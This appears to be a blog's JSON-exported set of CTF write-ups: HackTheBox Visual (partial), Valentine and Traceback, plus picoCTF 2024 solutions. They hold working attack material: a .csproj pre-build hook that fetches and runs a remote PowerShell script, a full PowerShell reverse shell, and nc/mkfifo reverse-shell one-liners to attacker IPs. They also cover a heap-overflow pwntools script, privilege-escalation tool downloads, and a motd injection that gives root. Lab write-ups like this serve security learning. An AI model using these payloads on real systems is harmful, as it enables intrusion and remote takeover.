guide to setup the Gitea server\nFirst add a user for the gitea service\n$ adduser --system --shell /bin/bash --gecos &#x27;Git Version Control&#x27; --group --disabled-password --home /home/git.git\n\nMake sure we have a database installed, in this case I used MariaDB\n$ apt install mariadb-server mariadb-client\nStart the service and make sure is is active\n$ systemctl start mysql  systemctl status mysql\n\nSetup password and remove all test users\n$ mysql_secure_installation\n\nCreate a database\n$ mysql -u root -pCREATE DATABASE gitea;GRANT ALL PRIVILEGES ON gitea.* TO &#x27;gitea&#x27;@&#x27;localhost&#x27; IDENTIFIED BY &quot;pass123&quot;;\n\nGitea ServiceNow we need to install GiteaDownload the binary, change the name, make it executable and move it to the &#x2F;usr&#x2F;local&#x2F;bin directory, lastly run gitea –version to test if it works (you might need to restart the terminal to update binaries)\n$ curl -s  https://api.github.com/repos/go-gitea/gitea/releases/latest |grep browser_download_url  |  cut -d &#x27;&quot;&#x27; -f 4  | grep &#x27;\\linux-amd64$&#x27; | wget -i - mv gitea-&lt;version&gt;-linux-amd64 gitea chmod +x gitea mv gitea /usr/local/bin/ gitea --version\n\nConfigure a systemd service for Gitea\n$ mkdir -p /etc/gitea /var/lib/gitea/&#123;custom,data,indexers,public,log&#125;$ chown git:git /var/lib/gitea/&#123;data,indexers,log&#125;$ chmod 750 /var/lib/gitea/&#123;data,indexers,log&#125;$ chown root:git /etc/gitea$ chmod 770 /etc/gitea\n\nCreate &#x2F;etc&#x2F;systemd&#x2F;system&#x2F;gitea.service\n[Unit]Description=Gitea (Git with a cup of tea)After=syslog.targetAfter=network.targetAfter=mysql.service[Service]LimitMEMLOCK=infinityLimitNOFILE=65535RestarttSec=2sType=simpleUser=gitGroup=gitWorkingDirectory=/var/lib/gitea/ExecStart=/usr/local/bin/gitea web -c /etc/gitea/app.iniRestart=alwaysEnvironment=USER=git HOME=/home/git GITEA_WORK_DIR=/var/lib/gitea[Install]WantedBy=multi-user.target\n\nReload daemons and start the gitea service\n$ systemctl daemon-reload systemctl start gitea systemctl status gitea\n\nWe are now able to access the gitea configuration through our browserUse the same password that was used in the database configurationDisable self-registrationLastly, create administrator account and install gitea\nWe now have a gitea server running\nCreate RepositoryNow we need to create a local repository, where we will have the malicious code laterJust press the button to create a repository on the Web Gitea page and give the repo a name, in this case I named it ‘exploit’Now create the repository local machine\n$ touch README.mdgit init git checkout -b maingit add README.mdgit commit -m &quot;first commit&quot;git remote add origin http://&lt;Attacker IP&gt;:3000/&lt;user&gt;/exploit.giteagit push -u origin main\n\n\nExploitC ProjectNow I cloned a Simple C Project to the created repo directory to test if the target compiles it.\n$ git clone https://github.com/CsEnox/vs-rce\n\nAdd the downloaded files to the created repository and push the files\n$ git add rcegit add rce.slngit commit -m &#x27;commit&#x27;git push -u origin main\n\nMake sure the files are in the repository\nFinally, test the target compiler, and see if it compiles our project\nIt works! Now we need to insert malicious code in our repository\nMalicious .csprojAccording to Microsoft’s Documentation, we can execute code before the build happens.We will edit our .csproj file to download a reverse shell from our machineMake sure to change to the correct IP and port on both files accordingly\n&lt;Project Sdk=&quot;Microsoft.NET.Sdk&quot;&gt;  &lt;PropertyGroup&gt;    &lt;OutputType&gt;Exe&lt;/OutputType&gt;    &lt;TargetFramework&gt;net7.0&lt;/TargetFramework&gt;    &lt;RootNamespace&gt;project_name&lt;/RootNamespace&gt;    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;    &lt;Nullable&gt;enable&lt;/Nullable&gt;  &lt;/PropertyGroup&gt;  &lt;Target Name=&quot;PreBuild&quot; BeforeTargets=&quot;PreBuildEvent&quot;&gt;    &lt;Exec Command=&quot;powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://10.10.14.3:8000/revshell.ps1&#x27;)&quot; /&gt;  &lt;/Target&gt;&lt;/Project&gt;\nDon’t forget to push the changes to the project to our git repository\n$ git commit -m &#x27;commit&#x27;git push -u origin main\n\n\nThe reverse shell file (revshell.ps1):\n$socket = new-object System.Net.Sockets.TcpClient(&#x27;10.10.14.3&#x27;, 1234);if($socket -eq $null)&#123;exit 1&#125;$stream = $socket.GetStream();$writer = new-object System.IO.StreamWriter($stream);$buffer = new-object System.Byte[] 1024;$encoding = new-object System.Text.AsciiEncoding;do&#123;  $writer.Flush();  $read = $null;  $res = &quot;&quot;  while($stream.DataAvailable -or $read -eq $null) &#123;    $read = $stream.Read($buffer, 0, 1024)  &#125;  $out = $encoding.GetString($buffer, 0, $read).Replace(&quot;`r`n&quot;,&quot;&quot;).Replace(&quot;`n&quot;,&quot;&quot;);  if(!$out.equals(&quot;exit&quot;))&#123;    $args = &quot;&quot;;    if($out.IndexOf(&#x27; &#x27;) -gt -1)&#123;      $args = $out.substring($out.IndexOf(&#x27; &#x27;)+1);      $out = $out.substring(0,$out.IndexOf(&#x27; &#x27;));      if($args.split(&#x27; &#x27;).length -gt 1)&#123;                $pinfo = New-Object System.Diagnostics.ProcessStartInfo                $pinfo.FileName = &quot;cmd.exe&quot;                $pinfo.RedirectStandardError = $true                $pinfo.RedirectStandardOutput = $true                $pinfo.UseShellExecute = $false                $pinfo.Arguments = &quot;/c $out $args&quot;                $p = New-Object System.Diagnostics.Process                $p.StartInfo = $pinfo                $p.Start() | Out-Null                $p.WaitForExit()                $stdout = $p.StandardOutput.ReadToEnd()                $stderr = $p.StandardError.ReadToEnd()                if ($p.ExitCode -ne 0) &#123;                    $res = $stderr                &#125; else &#123;                    $res = $stdout                &#125;      &#125;      else&#123;        $res = (&amp;&quot;$out&quot; &quot;$args&quot;) | out-string;      &#125;    &#125;    else&#123;      $res = (&amp;&quot;$out&quot;) | out-string;    &#125;    if($res -ne $null)&#123;        $writer.WriteLine($res)    &#125;  &#125;&#125;While (!$out.equals(&quot;exit&quot;))$writer.close();$socket.close();$stream.Dispose()\n\nRunning the exploitHead to the directory where we have out revshell.ps1 fileStart a python http server with the port we used in the .csproj file\n$ python3 -m http.server 8000\n\nAlso setup a netcat listener with the port we used in the revshell.ps1 file\n$ nc -lvnp 1234\n\nNow if we build our project again in the target machine, it will download the reverse shell from out machine\nAnd we get a shell on our netcat listener\nWe now have a shell as the user enox\n$ whoamivisual\\enox\n\nWe can just get the user.txt file from the user’s desktop\ncd C:\\Users\\enox\\Desktoptype user.txt1330b09f170648444f8729b38eccb044\n\nPrivEscNT Authority\\Local ServiceI headed to the uploads directory, where the compiled projects were saved to\ncd C:\\xampp\\htdocs\\uploadsdir\n\nThere was a todo.txt file in the directory\nI tried accessing the file through the browser, I didn’t get an error, so I assumed the file was accessible through the browser\nSo I uploaded a php revshell to the same directoryI used pentestmonkey’s php-reverse-shell.php, downloaded it to my machine, changed the IP and Port and started a python http server again\nOn local machine in the php-reverse-shell.php directory:\n$ python3 -m http.server 8000\n\nOn target machine:\ncmd /c powershell Invoke-WebRequest -Uri http://&lt;AttackerIP&gt;:8000/php-reverse-shell.php -OutFile C:\\xampp\\htdocs\\uploads\\shell.php\n\nWe now have the shell.php file in the target machine uploads directory\nNow we setup a listener on the port we have in our reverse shell\n$ nc -lvnp 1337\n\nAnd we open the shell in our browser:\nWe get a shell as NT Authority\\Local Service\nFullPowersWe still can’t access the administrator flag\nSince we have a local service account, we can use FullPowers to escalate our privileges and allows us to use GodPotato and impersonate another client, to get the admin flag\nDownload both FullPowers and GodPotato to local machine\nStart Python http server in the files directory\n$ python3 -m http.server 8000\n\nDownload the files in our target machine\npowershell Invoke-WebRequest -Uri http://&lt;AttackerIP&gt;:8000/FullPowers.exe -OutFile Fullpowers.exepowershell Invoke-WebRequest -Uri http://&lt;AttackerIP&gt;:8000/GodPotato.exe -OutFile GodPotato.exedir\n\nNow if we run FullPowers.exe, we will get more privileges as Local Service\nFullpowers.exewhomai /priv\n\nGodPotatoWe can now use GodPotato to impersonate another user and get the root.txt flag\nGodPotato -cmd &quot;cmd /c type C:\\Users\\Administrator\\Desktop\\root.txt&quot;\n\n","categories":["HTB"],"tags":["machine","medium"]},{"title":"picoCTF 2024","url":"/picoCTF/picoCTF2024/","content":"GeneralSuper SSH\nssh ctf-player@titan.picoctf.net -p 63095\n\n\nCommitment Issues\nAfter unzipping, we have a  message.txt file with the following message\n\nWe can run git log to see older commits\n\nFrom this we know that the flag was created in the previous commit\nWe can change to that commit\ngit checkout 87b85d7dfb839b077678611280fa023d76e017b8\n\n\nWe can now see the flag inside message.txt\n\nTime Machine\nAfter unzipping and reading message.txt\n\nThe flag is in the git log\ngit log\n\n\nBlame Game\nThe content of message.py is an unfinished command\n\nIf we run git log, we can see a huge list of commits\nSend the output of the git log command to a .txt file\ngit log &gt; output.txt\n\nIf we cat the output now, we can see the flag in the author name of one of the earliest commits\n\nCollaborative Development\nflag.py content\n\nIf we list all branches, we can see different branches, related to different parts\ngit branch -a\n\n\nWe can use git diff to see all the differences in the branches, and each part has a part of the flag\ngit diff feature/part-1 feature/part-2 feature/part-3\n\n\nbinhexa\nIn this challenge we need to answer a bunch of questions related to binary operations, the numbers are random every timeI used this binary calculator\n\nBinary Search\nIn this challenge, the best strategy is to keep finding the median in between guesses\n\nendianness\nFor this challenge I used a python script to convert ASCII to little and big endian, just change the input_string \ndef ascii_to_little_endian(input_string):    # Convert the input string to ASCII bytes    ascii_bytes = input_string.encode(&#x27;ascii&#x27;)        # Convert ASCII bytes to little endian hexadecimal representation    little_endian_hex = &#x27;&#x27;.join(format(byte, &#x27;02x&#x27;) for byte in reversed(ascii_bytes))        return little_endian_hexdef ascii_to_big_endian(input_string):    # Convert the input string to ASCII bytes    ascii_bytes = input_string.encode(&#x27;ascii&#x27;)        # Convert ASCII bytes to big endian hexadecimal representation    big_endian_hex = &#x27;&#x27;.join(format(byte, &#x27;02x&#x27;) for byte in ascii_bytes)        return big_endian_hex# Example usage for little endian:input_string = &quot;lopmo&quot;little_endian_hex = ascii_to_little_endian(input_string)print(&quot;Little Endian Hexadecimal Representation:&quot;, little_endian_hex)# Example usage for big endian:big_endian_hex = ascii_to_big_endian(input_string)print(&quot;Big Endian Hexadecimal Representation:&quot;, big_endian_hex)\n\n\ndont-you-love-banners\nWe can use nc to see what information is leaking, and we can see a password\n\nWe can use this password to connect to the application\nThe other two questions are easily googled\n\nWe are now in a shell as the user player, and in it’s home directory we have a text file\n\nWe have access to the &#x2F;root directory, but no permission to read flag.txt\n\nHowever we have access to the &#x2F;etc&#x2F;shadow file\n\nWe can crack the root’s hash\n\n\nNow just change user to root and cat the flag.txt\n\nBinary Exploitationformat string 0\nThis one is very simple, we can spam the %p parameter\n\n\nheap 0\nFor this challenge, in the source code, the check_win function just compares the safe_var variable to the string “bico”, if the safe_var variable is not equal to “bico” the code runs.So we just need to overflow the stack until the safe_var variable is not equal to “bico”\nWe can just spam A’s and safe_var will be overwritten\n\n\n\nheap 1\nLooking at the source code, this is very similar to the previous challenge, however, this time the check_win() function will only run if safe_var is equal to “pico”\n\nTo find the point in which the safe_var starts being overwritten, I created a 50 character pattern\n/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 50\n\n\nWith this pattern, we can see that safe_var starts being overwritten in 0Ab1\nSo we just need to replace 0Ab1Ab2Ab3Ab4Ab5Ab with “pico”\n\nNow just use option 4 to print the flag\n\nheap 2\nThis time the function check_win() dereferences a pointer (x), assumes that the value stored at that memory address is the address of a function\n\nSo we first need to find where x starts being overwritten, and then write the address of the win() function\n\nFind where x starts being overwritten\n\nx starts being overwritten after 32 chars\nThen I used pwndbg to find the win() function address\n\nThe memory address for the win() function is 0x4011a0\nThen I made a python script to send 32 chars, and then the memory address for the win() function\nfrom pwn import *# Connect to the remote host and porthost = &#x27;mimas.picoctf.net&#x27;port = 61553p = remote(host, port)# Pause to allow time for the binary to start uppause()# Select option 2 to write to the bufferp.sendline(&#x27;2&#x27;)# Send the payload to trigger buffer overflowpayload = b&quot;A&quot; * 32 + b&quot;\\xa0\\x11\\x40&quot;p.sendline(payload)# Select option 4 to print the flagp.sendline(&#x27;4&#x27;)# Receive and print the flagprint(p.recvuntil(&#x27;&#125;&#x27;).decode())\n\n\nForensicsScan Surprise\nAfter unzipping, we have a flag.png file that contains a QR code\n\nWe just need to scan it for the flag\n\nVerify\nIn this challenge, ssh into the machine and cat checksum.txt\n\nThis is the sha256 checksum of the file we need to find\nIn the files directory we have a huge list of files\n\nWe just need to check the sha256 hash of all the files, and grep the one we want from the checksum.txt\nsha256sum * | grep &quot;fba9f49bf22aa7188a155768ab0dfdc1f9b86c47976cd0f7c9003af2e20598f7&quot;\n\n\nWe now just run the decrypt.sh with this file\n\nCanYouSee\nFor this challenge, we just have a .jpg file\nThe image gives us nothing\n\nI went to look for the magic bytes by using head, and ended up finding a base64 encoded string\ncat ukn_reality.jpg | head\n\n\nWe can just decode this\n\nSecret of the Polyglot\nIn this challenge, we have a pdf file, and if we open it, we can see the second half of the flag\n\nIf we look at the file’s magic bytes,  we will find the PNG magic bytes\n\nJust change the extension to .png and open it\n\nWe now have the first half of the flag too\n\nMob psycho\nThis challenge gives us an apk fileWe can unzip apk files, after unzipping we are left with a lot of files to search through\n\nI ended up finding a flag.txt file\nfind . -type f -name &quot;*flag*&quot;\n\n\n\nConvert from hex and we get the flag\n\n","categories":["picoCTF"],"tags":["ctf"]},{"title":"[HTB] Valentine","url":"/HTB/Valentine/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      mrb3n\n    \n    \n      Release Date:\n      February 17, 2018\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\nReconNmap Initial Scan$ nmap -sC -sV 10.10.10.79 -o nmap_scan Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 18:42 WETNmap scan report for 10.10.10.79Host is up (0.061s latency).Not shown: 997 closed tcp ports (reset)PORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))|_http-title: Site doesn&#x27;t have a title (text/html).|_http-server-header: Apache/2.2.22 (Ubuntu)443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))|_http-server-header: Apache/2.2.22 (Ubuntu)| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US| Not valid before: 2018-02-06T00:45:25|_Not valid after:  2019-02-06T00:45:25|_ssl-date: 2023-12-17T18:42:57+00:00; 0s from scanner time.|_http-title: Site doesn&#x27;t have a title (text/html).Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 17.27 seconds\n\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nApache\n\n\n443\nApache\n\n\nNmap Script Scan$ nmap --script vuln -p 443 10.10.10.79  Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 18:47 WETPre-scan script results:| broadcast-avahi-dos: |   Discovered hosts:|     224.0.0.251|   After NULL UDP avahi packet DoS (CVE-2011-1002).|_  Hosts are all up (not vulnerable).PORT    STATE SERVICE443/tcp open  https| ssl-ccs-injection: |   VULNERABLE:|   SSL/TLS MITM vulnerability (CCS Injection)|     State: VULNERABLE|     Risk factor: High|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h|       does not properly restrict processing of ChangeCipherSpec messages,|       which allows man-in-the-middle attackers to trigger use of a zero|       length master key in certain OpenSSL-to-OpenSSL communications, and|       consequently hijack sessions or obtain sensitive information, via|       a crafted TLS handshake, aka the &quot;CCS Injection&quot; vulnerability.|           |     References:|       http://www.cvedetails.com/cve/2014-0224|       http://www.openssl.org/news/secadv_20140605.txt|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.| ssl-poodle: |   VULNERABLE:|   SSL POODLE information leak|     State: VULNERABLE|     IDs:  CVE:CVE-2014-3566  BID:70574|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other|           products, uses nondeterministic CBC padding, which makes it easier|           for man-in-the-middle attackers to obtain cleartext data via a|           padding-oracle attack, aka the &quot;POODLE&quot; issue.|     Disclosure date: 2014-10-14|     Check results:|       TLS_RSA_WITH_AES_128_CBC_SHA|     References:|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566|       https://www.securityfocus.com/bid/70574|       https://www.openssl.org/~bodo/ssl-poodle.pdf|_      https://www.imperialviolet.org/2014/10/14/poodle.html| ssl-heartbleed: |   VULNERABLE:|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.|     State: VULNERABLE|     Risk factor: High|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.|           |     References:|       http://www.openssl.org/news/secadv_20140407.txt |       http://cvedetails.com/cve/2014-0160/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.| http-enum: |   /dev/: Potentially interesting directory w/ listing on &#x27;apache/2.2.22 (ubuntu)&#x27;|_  /index/: Potentially interesting folderNmap done: 1 IP address (1 host up) scanned in 77.39 seconds\n\nImportant vulnerability found\n\n| ssl-heartbleed:|   VULNERABLE:|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL&#x2F;TLS encryption.|     State: VULNERABLE|     Risk factor: High|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.||     References:|       http://www.openssl.org/news/secadv_20140407.txt|       http://cvedetails.com/cve/2014-0160/|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160\n\nWe will use this later\nGobuster$ gobuster dir --url http://10.10.10.79/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.10.79/[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================/.hta                 (Status: 403) [Size: 283]/.htaccess            (Status: 403) [Size: 288]/.htpasswd            (Status: 403) [Size: 288]/cgi-bin/             (Status: 403) [Size: 287]/decode               (Status: 200) [Size: 552]/dev                  (Status: 301) [Size: 308] [--&gt; http://10.10.10.79/dev/]/encode               (Status: 200) [Size: 554]/index                (Status: 200) [Size: 38]/index.php            (Status: 200) [Size: 38]/server-status        (Status: 403) [Size: 292]Progress: 4723 / 4724 (99.98%)===============================================================Finished===============================================================\nImportant directory:\n\n&#x2F;dev\n\nFootholdPrivate RSA KeyLooking at the &#x2F;dev directory, we can see two files\nLooking at hype_key, we can see that is is in hex\nIf we decode it, we get a private RSA key\nJust save the content inside a file with the same name found in &#x2F;dev (hype_key)\nHowever, this is not enough, because this key is protected with a password.If we try to ssh into the machine with the user “hype” we get asked for a passphrase\nheartbleedAs we found in the Nmap script scan, this machine is vulnerable to CVE-2014-0160\nWe can use metasploit for this\nRemember to change action to dump (set action dump)\nNow just run the exploit (you might need to run it several times)\nThen if we run strings in the dump files, we will eventually come across a base64 encoded string\n\nheartbleedbelievethehype\n\nThis is the password for the obtained RSA key\nUser FlagWe can now SSH into the machine and get the user flag\nPrivEsctmuxIf we check the commands history for the user hype, we can see that he ran tmux\nWe can just run tmux with the same file he ran it with, and we get root\n$ tmux -S /.devs/dev_sess\n\n","categories":["HTB"],"tags":["machine","easy"]},{"title":"[HTB] Traceback","url":"/HTB/Traceback/","content":"\n\n  \n  \n  \n\n  \n  \n    \n      OS:\n      Linux\n    \n    \n      Difficulty:\n      Easy\n    \n    \n      Author:\n      Xh4H\n    \n    \n      Release Date:\n      March 14, 2020\n    \n  \n\n\n\n\n  @media (max-width: 600px) {\n    div[style*=\"display: flex; flex-wrap: wrap;\"] {\n      flex-direction: column;\n      align-items: center;\n    }\n\n    div[style*=\"flex: 1 1 auto;\"] {\n      max-width: 100%;\n      text-align: center;\n    }\n\n    div[style*=\"flex: 1 1 300px;\"] {\n      flex: 1 1 auto;\n      max-width: 100%;\n    }\n  }\n\n\n\nReconNmap$ nmap -sC -sV 10.10.10.181 -o nmap_scanStarting Nmap 7.94SVN ( https://nmap.org ) at 2023-12-17 23:32 WETNmap scan report for 10.10.10.181Host is up (0.060s latency).Not shown: 998 closed tcp ports (reset)PORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))|_http-title: Help us|_http-server-header: Apache/2.4.29 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 9.86 seconds\n\n\n\n\nPort\nService\n\n\n\n22\nSSH\n\n\n80\nApache\n\n\nApache Web PageWeb page running on port 80\nHTML code\nFootholdsmevk.phpBy the previous screenshots from the web page, we get a hint that there is already a backdoor in the machine and the phrase “Some of the best web shells that you might need ;)”\nIf we google that phrase, we will find a github repo with a list of web shells\nWe can try them one by one, or just add them all to a list and run Gobuster\n\n$ gobuster dir --url http://10.10.10.181 --wordlist shells.txt ===============================================================Gobuster v3.6by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url:                     http://10.10.10.181[+] Method:                  GET[+] Threads:                 10[+] Wordlist:                shells.txt[+] Negative Status codes:   404[+] User Agent:              gobuster/3.6[+] Timeout:                 10s===============================================================Starting gobuster in directory enumeration mode===============================================================Progress: 21 / 22 (95.45%)/smevk.php            (Status: 200) [Size: 1261]===============================================================Finished===============================================================\n\nWe now know the web shell being used is smevk.php\nIf we look at the web shell code, we get the login default credentials\n\n\n\nUser\nPassword\n\n\n\nadmin\nadmin\n\n\nGetting a shellAfter we login, we are presented with the web shell dashboard, we can use the “Execute: “ field, to run a reverse shell.\n$ rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 1234 &gt;/tmp/f\n\nWe can upgrade our shell using python\n$ python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;ctrl+z stty raw -echo &amp;&amp; fg\n\nLateral MovementluvitRight now we have a shell as webadmin, if we run sudo -l, we will see that we can run &#x2F;home&#x2F;sysadmin&#x2F;luvit without a password\nRunning the history command, we can see that this binary uses .lua files, and that the previous user ran the command and then removed the .lua file\nWe just need to insert code to run a bash shell in a .lua file, and then run the binary as sysadmin since we do not need a password\n$ echo &quot;require(&#x27;os&#x27;);&quot; &gt; root.lua$ echo &quot;os.execute(&#x27;/bin/bash&#x27;);&quot; &gt;&gt; root.lua\n\nNow we just run the binary as sysadmin and we get a shell\n$ sudo -u sysadmin /home/sysadmin/luvit root.lua\n\nNow just get the user flag\nPrivEscSwitching to SSHBefore trying to escalate our privileges, we should switch to SSHTo do this, we can just generate some ssh keys in our machine and add the .pub key to the authorized_keys in &#x2F;home&#x2F;sysadmin&#x2F;.ssh&#x2F;authorized_keys\nFirst generate the keys in our local machine\nThen copy the content of id_rsa.pub to &#x2F;home&#x2F;sysadmin&#x2F;.ssh&#x2F;authorized_keys\n$ echo &quot;&lt;id_rsa.pub content&gt;&quot;  &gt;&gt; /home/sysadmin/.ssh/authorized_keys\n\nNow we can ssh as sysadmin using the id_rsa private key\n$ ssh -i id_rsa sysadmin@10.10.10.181\n\nIf you notice, we get a custom banner for logging in with SSH\npspyWe can now use pspy64 to monitor processes and see if anything is being ran in the background\nTo transfer the pspy64 binary to the target machine, download it to your local machine and start a python http server in it’s directory\n$ python3 -m http.server 1234\n\nNow just download it in the target machine and make it executable\n$ wget http://&lt;Attacker-IP&gt;:1234/pspy64$ chmod +x pspy64\n\nNow if you run it and wait for a while, we will see some commands being ran\n\nHere we can see that files from &#x2F;var&#x2F;backups&#x2F;.update-motd.d&#x2F; are being copied to &#x2F;etc&#x2F;update-motd.d&#x2F; every 30 seconds\nrootIf we look at &#x2F;etc&#x2F;update-motd.d&#x2F;00-header we will find the exact message we got when we logged in with SSH at the bottom\nWhat we can gather from this is the following:\nWhen we login with SSH the code in the 00-header file gets executed, and since the SSH Server always runs as root, this means that this code is being executed as root.\nIf we insert code in this file to run a reverse shell, we should get a shell as root.\nHowever this file gets restored every 30 seconds.What we need to do is:\n1 - Start a netcat listener2 - Insert malicious reverse shell code in &#x2F;etc&#x2F;update-motd.d&#x2F;00-header file3 - Start a new ssh session in the machine to execute the code before it gets restored\nIf we do all of this correctly, we will get a shell as root\nLocal Machine: \n$ nc -lvnp 1337\nNow the next 2 steps need to be done quickly\nRemote Server (sysadmin session):\n$ echo &quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.10.14.9 1337 &gt;/tmp/f&quot; &gt;&gt; /etc/update-motd.d/00-header\n\nLocal Machine:\n$ ssh -i id_rsa sysadmin@10.10.10.181\n\nWe should now have a shell as root on our netcat listener\nNow just get the root flag\n","categories":["HTB"],"tags":["machine","easy"]}]